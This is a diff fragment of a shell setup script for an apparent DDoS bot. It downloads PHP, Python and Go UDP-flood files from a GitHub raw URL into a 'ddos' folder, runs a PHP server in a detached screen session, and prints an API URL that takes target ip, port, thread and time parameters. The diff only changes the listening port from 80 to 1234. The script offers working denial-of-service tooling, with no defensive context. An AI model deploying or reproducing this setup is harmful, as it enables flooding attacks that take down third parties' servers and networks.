@@ -18,7 +18,7 @@ cd ddos
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/index.php -o index.php
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/udp.py -o udp.py
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/udp.go -o udp.go
-screen -dmS ddos php -S 0.0.0.0:80
+screen -dmS ddos php -S 0.0.0.0:1234
 ip_server=$(curl -s ifconfig.me)
-echo "Setup Success, API: http://$ip_server/"
+echo "Setup Success, API: http://$ip_server:1234"
 echo "Usage: http://$ip_server/?ip=1.1.1.1&port=80&thread=100&time=100"
